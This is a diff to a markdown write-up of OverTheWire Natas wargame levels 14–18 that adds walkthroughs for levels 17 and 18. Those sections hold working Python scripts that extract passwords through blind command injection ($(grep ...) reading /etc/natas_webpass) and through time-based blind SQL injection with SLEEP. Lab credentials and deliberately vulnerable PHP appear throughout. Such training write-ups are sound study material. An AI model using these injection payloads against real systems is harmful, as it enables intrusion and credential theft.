@@ -458,16 +458,14 @@ Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
 
 ## Natas 14
 
-> The page shows this form:
-> ![form](pics/natas/2025-07-01-20-16-15.png)
-
-The source code now implements some kind of check on the extention of the uploaded file:
-
-```php
-if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
-    echo "File is not an image";
-}
-```
+> The page shows this form:  
+> ![form](pics/natas/2025-07-01-20-16-15.png)  
+> The source code now implements some kind of check on the extention of the uploaded file:  
+> ```php
+> if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+>     echo "File is not an image";
+> }
+> ```
 
 If we look at how `exif_imagetype` works, we can see that it reads the first bytes of the image file to determine its type based on its signature (not the file extension). This means we can bypass the extension check by uploading a file with a valid image signature, even if the file itself is not a valid image (a script for example).
 
@@ -488,37 +486,35 @@ Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
 
 ## Natas 15
 
-> The page shows this form:
-> ![form](pics/natas/2025-07-05-11-15-51.png)
-> The source code is:
-
-```php
-<?php
-if(array_key_exists("username", $_REQUEST)) {
-    $link = mysqli_connect('localhost', 'natas14', '<censored>');
-    mysqli_select_db($link, 'natas14');
-
-    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
-    if(array_key_exists("debug", $_GET)) {
-        echo "Executing query: $query<br>";
-    }
-
-    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
-            echo "Successful login! The password for natas15 is <censored><br>";
-    } else {
-            echo "Access denied!<br>";
-    }
-    mysqli_close($link);
-} else {
-?>
-
-<form action="index.php" method="POST">
-Username: <input name="username"><br>
-Password: <input name="password"><br>
-<input type="submit" value="Login" />
-</form>
-<?php } ?>
-```
+> The page shows this form:  
+> ![form](pics/natas/2025-07-05-11-15-51.png)  
+> The source code is:  
+> ```php
+> <?php
+> if(array_key_exists("username", $_REQUEST)) {
+>     $link = mysqli_connect('localhost', 'natas14', '<censored>');
+>     mysqli_select_db($link, 'natas14');
+> 
+>     $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+>     if(array_key_exists("debug", $_GET)) {
+>         echo "Executing query: $query<br>";
+>     }
+> 
+>     if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+>             echo "Successful login! The password for natas15 is <censored><br>";
+>     } else {
+>             echo "Access denied!<br>";
+>     }
+>     mysqli_close($link);
+> } else {
+> ?>
+> <form action="index.php" method="POST">
+> Username: <input name="username"><br>
+> Password: <input name="password"><br>
+> <input type="submit" value="Login" />
+> </form>
+> <?php } ?>
+> ```
 
 The code connects to the MySQL database and checks if the provided username and password match any user in the `users` table.
 If the query returns any rows, it means the login is successful and the password for natas15 is printed.  
@@ -540,49 +536,48 @@ Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
 
 ## Natas 16
 
-> The page shows this form:
-> ![form](pics/natas/2025-07-05-11-30-37.png)
+> The page shows this form:  
+> ![form](pics/natas/2025-07-05-11-30-37.png)  
 > The source code is:
-
-```php
-<?php
-/*
-CREATE TABLE `users` (
-  `username` varchar(64) DEFAULT NULL,
-  `password` varchar(64) DEFAULT NULL
-);
-*/
-
-if(array_key_exists("username", $_REQUEST)) {
-    $link = mysqli_connect('localhost', 'natas15', '<censored>');
-    mysqli_select_db($link, 'natas15');
-
-    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
-    if(array_key_exists("debug", $_GET)) {
-        echo "Executing query: $query<br>";
-    }
-
-    $res = mysqli_query($link, $query);
-    if($res) {
-    if(mysqli_num_rows($res) > 0) {
-        echo "This user exists.<br>";
-    } else {
-        echo "This user doesn't exist.<br>";
-    }
-    } else {
-        echo "Error in query.<br>";
-    }
-
-    mysqli_close($link);
-} else {
-?>
-
-<form action="index.php" method="POST">
-Username: <input name="username"><br>
-<input type="submit" value="Check existence" />
-</form>
-<?php } ?>
-```
+> ```php
+> <?php
+> /*
+> CREATE TABLE `users` (
+>   `username` varchar(64) DEFAULT NULL,
+>   `password` varchar(64) DEFAULT NULL
+> );
+> */
+> 
+> if(array_key_exists("username", $_REQUEST)) {
+>     $link = mysqli_connect('localhost', 'natas15', '<censored>');
+>     mysqli_select_db($link, 'natas15');
+> 
+>     $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+>     if(array_key_exists("debug", $_GET)) {
+>         echo "Executing query: $query<br>";
+>     }
+> 
+>     $res = mysqli_query($link, $query);
+>     if($res) {
+>       if(mysqli_num_rows($res) > 0) {
+>           echo "This user exists.<br>";
+>       } else {
+>           echo "This user doesn't exist.<br>";
+>       }
+>     } else {
+>         echo "Error in query.<br>";
+>     }
+> 
+>     mysqli_close($link);
+> } else {
+> ?>
+> 
+> <form action="index.php" method="POST">
+> Username: <input name="username"><br>
+> <input type="submit" value="Check existence" />
+> </form>
+> <?php } ?>
+> ```
 
 The code connects to the MySQL database and checks if the provided username exists in the `users` table.
 If the query returns any rows, it means the user exists and a message is printed.  
@@ -633,3 +628,155 @@ This script will try each character in the character set for each position in th
 ![Password](pics/natas/2025-07-05-12-27-12.png)
 
 Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+
+## Natas 17
+
+> The page shows this form:  
+> ![form](pics/natas/2025-07-05-23-20-41.png)  
+> The source code is:  
+> 
+> ```php
+> <?
+> $key = "";
+>
+> if(array_key_exists("needle", $_REQUEST)) {
+>     $key = $_REQUEST["needle"];
+> }
+> 
+> if($key != "") {
+>     if(preg_match('/[;|&`\'"]/',$key)) {
+>         print "Input contains an illegal character!";
+>     } else {
+>         passthru("grep -i \"$key\" dictionary.txt");
+>     }
+> }
+> ?>
+> ```
+
+We have another grep challenge.
+The code uses `preg_match` to check if the input contains any of the characters `;`, `|`, `&`, `` ` ``, `'` or `"`. If it does, it prints an error message. Despite this, we can still use `$(command)` to execute a command and use its output as input for the `grep` command.
+One idea is to cat the password for natas17 from the `/etc/natas_webpass/natas17` file, append it to dictionary.txt and then look for it in the file:
+
+```bash
+$(cat /etc/natas_webpass/natas17 >> dictionary.txt)
+$(cat /etc/natas_webpass/natas17)
+```
+
+Unfortunately, this doesn't work.  
+THINK KARIM, THINK!  
+What if we grep the password for natas17 and check with which character it starts?  
+If we don't guess the character, an empty string will be given as input to the `grep` command on dictionary.txt, which will return the content of dictionary.txt. BUT, if we guess the first character, we will get the password for natas17, which will be given as input to the `grep` command on dictionary.txt, which will return nothing, since the password is not in the dictionary.txt file.  
+Thank to this different behavior we can do a blind attack and guess the password character by character:
+
+```python
+import requests
+import string
+from requests.auth import HTTPBasicAuth
+
+URL = "http://natas16.natas.labs.overthewire.org/index.php"
+auth=HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
+headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+known = ""
+found = True
+charSet = string.digits + string.ascii_letters
+
+for i in range(1, 65):
+        if not found:
+                break
+        for c in charSet:
+                queryString = f'?needle=$(grep ^{known+c} /etc/natas_webpass/natas17)&submit=Search'
+                r = requests.post(url=URL+queryString, headers=headers, auth=auth)
+                if "<pre>\n</pre>" in r.text:
+                        found = True
+                        known += c
+                        print(known)
+                        break
+                else:
+                        found = False
+```
+
+This script will send a request with a payload that greps the password with the current known password plus the next character in the character set. If the response contains `<pre>` tags, it means the query returned no results and we found the correct character. Otherwise, we try the next character.
+
+![password](pics/natas/2025-07-06-11-07-57.png)
+
+Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+
+## Natas 18
+
+> The page shows this form:  
+> ![form](pics/natas/2025-07-06-11-11-25.png)  
+> The source code is:  
+> ```php
+> <?php
+> /*CREATE TABLE `users` (
+>   `username` varchar(64) DEFAULT NULL,
+>   `password` varchar(64) DEFAULT NULL
+> );*/
+>
+> if(array_key_exists("username", $_REQUEST)) {
+>     $link = mysqli_connect('localhost', 'natas17', '<censored>');
+>     mysqli_select_db($link, 'natas17');
+> 
+>     $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+>     if(array_key_exists("debug", $_GET)) {
+>         echo "Executing query: $query<br>";
+>     }
+> 
+>     $res = mysqli_query($link, $query);
+>     if($res) {
+>       if(mysqli_num_rows($res) > 0) {
+>         //echo "This user exists.<br>";
+>       } else {
+>         //echo "This user doesn't exist.<br>";
+>       }
+>     } else {
+>         //echo "Error in query.<br>";
+>     }
+> 
+>     mysqli_close($link);
+> } else {
+> ?>
+> 
+> <form action="index.php" method="POST">
+> Username: <input name="username"><br>
+> <input type="submit" value="Check existence" />
+> </form>
+> <?php } ?>
+> ```
+
+This level's source code is the same as natas16, except for the output echos which are commented. This makes the old solution not work anymore, since we can't check if the user exists or not.
+Let's keep in mind the script we used in natas16. A way to solve this is to delay the query if we find the correct character, so that we can check if the query took longer than usual. To do this, we can use the `SLEEP` function in MySQL, which delays the execution of the query for a specified number of seconds:
+
+```python
+import requests
+import string
+from requests.auth import HTTPBasicAuth
+import time
+
+URL = "http://natas17.natas.labs.overthewire.org/index.php?debug=1"
+auth=HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
+headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+known = ""
+found = True
+charSet = string.digits + string.ascii_letters
+
+for i in range(1, 65):
+    if not found:
+        break
+    for c in charSet:
+        payload = f'username=natas18" AND BINARY SUBSTRING(password,{i},1) = "{c}" AND sleep(5) -- '
+        start = time.time()
+        r = requests.post(url=URL, headers=headers, auth=auth, data=payload)
+        elapsed = time.time() - start
+        if elapsed > 4:
+            found = True
+            known += c
+            print(known)
+            break
+        else:
+            found = False
+```
+
+![password](pics/natas/2025-07-06-12-01-17.png)
+
+Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
